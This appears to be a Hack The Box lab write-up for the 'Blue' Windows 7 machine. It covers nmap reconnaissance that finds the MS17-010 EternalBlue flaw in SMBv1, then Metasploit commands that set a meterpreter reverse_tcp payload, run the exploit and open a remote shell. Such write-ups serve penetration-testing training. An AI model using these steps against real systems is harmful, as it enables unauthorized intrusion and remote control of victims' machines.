# Hack the Box - Blue
```CSS
Machine IP: 10.10.10.40 - Windows

Vulenerability:
- MS17-010 EternalBlue CVE-2017-0143
```

- [NMAP Scans](#NMAP)
  - [TCP all ports](#TCP-All-Ports)
  - [TCP service version and default scripts](#Open-TCP-Ports-Service-Version-and-Default-Scripts)
  - [TCP port #445 safe scripts](#Port-445-Safe-Scripts)

- [Metasploit](#Metasploit)
  - [Search Exploit](#Search-Exploit)
  - [Exploit Options](#Exploit-Options)
  - [Reverse Shell](#Reverse-Shell)

## NMAP
### TCP All Ports
```CSS
▶ nmap -Pn -sS -p- 10.10.10.40 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.40                                        
Host is up (0.19s latency).                                             
Not shown: 65526 closed tcp ports (reset)                                                                                                        
PORT      STATE SERVICE                                                 
135/tcp   open  msrpc                                                   
139/tcp   open  netbios-ssn                                             
445/tcp   open  microsoft-ds                                            
49152/tcp open  unknown                                                 
49153/tcp open  unknown                                                 
49154/tcp open  unknown                                                                                                                          
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
                                    
Nmap done: 1 IP address (1 host up) scanned in 70.46 seconds
```

### Open TCP Ports Service Version and Default Scripts
```CSS
▶ nmap -sC -sV -p 135,139,445,49152-49157 10.10.10.40 -oN deep.nmap

Nmap scan report for 10.10.10.40                                                                                                           [0/21]
Host is up (0.18s latency).                                             
                                                                                                                                                 
PORT      STATE SERVICE      VERSION                           
135/tcp   open  msrpc        Microsoft Windows RPC                      
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn              
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                      
49152/tcp open  msrpc        Microsoft Windows RPC                      
49153/tcp open  msrpc        Microsoft Windows RPC                      
49154/tcp open  msrpc        Microsoft Windows RPC                      
49155/tcp open  msrpc        Microsoft Windows RPC                      
49156/tcp open  msrpc        Microsoft Windows RPC                      
49157/tcp open  msrpc        Microsoft Windows RPC                      
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                         
                                    
Host script results:   
| smb2-security-mode:  
|   210:                            
|_    Message signing enabled but not required              
| smb2-time:                                                                                                                                     
|   date: 2023-04-13T17:38:57                                           
|_  start_date: 2023-04-13T17:27:27
| smb-security-mode:       
|   account_used: guest             
|   authentication_level: user                                          
|   challenge_response: supported                                       
|_  message_signing: disabled (dangerous, but default)    
| smb-os-discovery:                                                                                                                              
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)                                                                  
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC                                             
|   NetBIOS computer name: HARIS-PC\x00           
|   Workgroup: WORKGROUP\x00                                            
|_  System time: 2023-04-13T18:38:56+01:00        
|_clock-skew: mean: -20m14s, deviation: 34m36s, median: -15s                                                                                     

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                   
Nmap done: 1 IP address (1 host up) scanned in 75.47 seconds
```

### Port 445 Safe Scripts
```CSS
▶ nmap -Pn -n -p 445 --script safe -oN safe.nmap

<---SNIP--->

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

<---SNIP--->

# Nmap done at Thu Apr 13 23:22:33 2023 -- 1 IP address (1 host up) scanned in 106.08 seconds
```

---

## Metasploit
### Search Exploit
```CSS
msf6 > search eternalblue
```
![image](https://user-images.githubusercontent.com/83878909/231924001-a45f3cad-bd2e-4491-814f-2585eccf1cc8.png)


### Exploit Options
```CSS
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST tun0
> set RHOSTS 10.10.10.40
> exploit -j
```
![image](https://user-images.githubusercontent.com/83878909/231933782-b118443d-4573-44f1-92f4-8ba3a78df666.png)


### Reverse Shell
```CSS
> sessions -l
> sessions -i 1

meterpreter > shell
```
![image](https://user-images.githubusercontent.com/83878909/231934200-86eb56b0-d2e9-4841-8c24-4d411716b23e.png)

---


